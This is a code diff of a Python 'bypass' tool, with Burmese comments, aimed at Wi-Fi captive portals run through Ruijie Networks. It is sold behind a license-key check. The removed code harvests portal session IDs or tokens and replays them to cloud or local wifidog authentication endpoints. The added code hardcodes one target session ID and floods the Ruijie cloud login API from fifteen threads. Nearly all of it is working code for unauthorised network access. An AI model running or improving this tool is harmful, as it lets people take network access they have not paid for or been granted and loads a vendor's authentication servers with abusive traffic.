@@ -1,9 +1,8 @@
-import requests, re, urllib3, time, threading, sys, datetime, os, uuid, socket
-from urllib.parse import urlparse, parse_qs, urljoin
+import requests, re, urllib3, time, threading, sys, datetime, os, uuid, socket, random
+from urllib.parse import urlparse, parse_qs
 from rich.console import Console
 from rich.panel import Panel
 from rich.align import Align
-from rich.text import Text
 
 # ===============================
 # CONFIG & INITIALIZATION
@@ -11,11 +10,12 @@ from rich.text import Text
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 console = Console()
 
+# အစ်ကိုပို့ပေးသော Session ID ကို ဒီမှာ အသေထည့်ထားပါသည်
+TARGET_SID = "7f3ac1f1899b42d4bf4e296cc5ff009c"
 URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
-PING_THREADS = 15
 
 # COLOR SYSTEM
-RED, GREEN, CYAN, YELLOW, RESET = "\033[91m", "\033[92m", "\033[96m", "\033[93m", "\033[0m"
+RED, GREEN, CYAN, YELLOW, RESET = "\033[91m", "\033[92m", "\033[93m", "\033[96m", "\033[0m"
 
 BABY_LOGO = """
 [bold cyan]
@@ -37,7 +37,7 @@ BANNER = """
 [/bold #00FF00]"""
 
 # ===============================
-# LICENSE & HWID SYSTEM
+# LICENSE SYSTEM
 # ===============================
 def get_hwid():
     id_file = os.path.expanduser("~/.moe_yu_id")
@@ -48,23 +48,6 @@ def get_hwid():
         with open(id_file, "w") as f: f.write(new_id)
         return new_id
     except: return "MOE-998A7F92-675"
-
-def check_expiry(expiry_str):
-    if expiry_str.upper() in ["NONE", "LIFETIME", "FREE"]: return True, "Lifetime"
-    try:
-        expiry_date = datetime.datetime.strptime(expiry_str, '%Y-%m-%d')
-        if datetime.datetime.now() > expiry_date: return False, expiry_date.strftime('%d-%b-%Y')
-        return True, expiry_date.strftime('%d-%b-%Y')
-    except: return True, "Lifetime"
-
-def get_current_gateway():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        gw = ".".join(s.getsockname()[0].split('.')[:-1]) + ".1"
-        s.close()
-        return gw
-    except: return "192.168.61.1"
 
 def check_license():
     my_hwid = get_hwid()
@@ -81,16 +64,15 @@ def check_license():
         for entry in res.text.splitlines():
             parts = entry.split("|")
             if user_key == parts[0].strip():
+                # HWID စစ်ဆေးခြင်း
                 db_hwid = parts[2].strip() if len(parts) > 2 else "FREE"
                 if db_hwid != "FREE" and db_hwid != my_hwid:
                     print(f"{RED}❌ HWID MISMATCH!{RESET}")
                     sys.exit()
                 
-                is_active, date_label = check_expiry(parts[1].strip() if len(parts) > 1 else "None")
-                if is_active:
-                    console.print(f"\n[bold green]>>> AUTHENTICATION SUCCESS[/bold green]")
-                    console.print(Align.center(f"[bold yellow]EXPIRY: {date_label}[/bold yellow]\n"))
-                    return True
+                print(f"\n{GREEN}>>> AUTHENTICATION SUCCESS{RESET}")
+                print(f"      {YELLOW}EXPIRY: Lifetime{RESET}\n")
+                return True
         print(f"{RED}❌ INVALID KEY!{RESET}")
         sys.exit()
     except:
@@ -101,61 +83,32 @@ def check_license():
 # BYPASS ENGINE
 # ===============================
 def start_bypass():
+    # Cloud Login API လိပ်စာ
+    auth_link = f"https://portal-as.ruijienetworks.com/api/auth/login?sessionId={TARGET_SID}"
+    
+    def pulse():
+        while True:
+            try:
+                # Cloud Server ဆီသို့ အမြန်နှုန်းမြှင့် Request ပို့ခြင်း
+                requests.get(auth_link, timeout=10, verify=False)
+                # အမှန်ခြစ်လေးများ ပြသခြင်း
+                sys.stdout.write(f"{GREEN}[✓] CLOUD-INJECT | SID: {TARGET_SID[:15]}... | ACTIVE{RESET}\n")
+                sys.stdout.flush()
+            except: pass
+            time.sleep(0.05) # Pulse Speed မြှင့်ထားသည်
+
+    console.print(Panel.fit(f"[bold red]🔥 MOE YU BYPASS v8.7 PRO ACTIVATED 🔥[/bold red]\n[white]Target SID: {TARGET_SID}[/white]", border_style="white"))
+    
+    # Threads အများအပြားဖြင့် စတင်ခြင်း
+    for _ in range(15):
+        threading.Thread(target=pulse, daemon=True).start()
+    
     while True:
-        try:
-            session = requests.Session()
-            session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
-            
-            # ၁။ Redirect ရှာခြင်း
-            r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
-            if r.status_code == 204:
-                time.sleep(5)
-                continue
-            
-            portal_url = r.url
-            r1 = session.get(portal_url, timeout=10, verify=False)
-            
-            # ၂။ SID Extraction (URL ရော Page ထဲကပါ ရှာမည်)
-            params = parse_qs(urlparse(portal_url).query)
-            sid = (params.get('sessionId') or params.get('token') or [None])[0]
-            
-            if not sid:
-                sid_match = re.search(r'(?:sessionId|token)=([a-zA-Z0-9_\-]{15,})', r1.text)
-                sid = sid_match.group(1) if sid_match else None
-            
-            if sid:
-                # ၃။ Cloud သို့မဟုတ် Local ခွဲခြားခြင်း
-                if "ruijienetworks.com" in portal_url or "portal-as" in portal_url:
-                    auth_link = f"https://portal-as.ruijienetworks.com/api/auth/login?sessionId={sid}"
-                    mode = "CLOUD-FIX"
-                else:
-                    gw = get_current_gateway()
-                    auth_link = f"http://{gw}:2060/wifidog/auth?token={sid}"
-                    mode = "LOCAL-FIX"
-
-                # ၄။ Turbo Injector (အမှန်ခြစ်လေးများ ပေါ်မည့်နေရာ)
-                def pulse():
-                    while True:
-                        try:
-                            session.get(auth_link, timeout=10, verify=False)
-                            sys.stdout.write(f"{GREEN}[✓] {mode} | SID: {sid[:12]}... | Status: ACTIVE{RESET}\n")
-                            sys.stdout.flush()
-                        except: pass
-                        time.sleep(0.1)
-
-                for _ in range(PING_THREADS):
-                    threading.Thread(target=pulse, daemon=True).start()
-                
-                # အင်တာနက် အခြေအနေ စောင့်ကြည့်ခြင်း
-                while session.get("http://www.google.com", timeout=5).status_code == 200:
-                    time.sleep(15)
-            else:
-                sys.stdout.write(f"{RED}[-] TARGET SID NOT FOUND. PLEASE OPEN BROWSER LOGIN PAGE!{RESET}\n")
-                time.sleep(5)
-        except: time.sleep(5)
+        time.sleep(10)
 
 if __name__ == "__main__":
     if check_license():
-        console.print(Panel.fit("[bold red]🔥 MOE YU BYPASS PRO v8.5 ACTIVATED 🔥[/bold red]", border_style="white"))
-        try: start_bypass()
-        except KeyboardInterrupt: sys.exit()
+        try:
+            start_bypass()
+        except KeyboardInterrupt:
+            sys.exit()
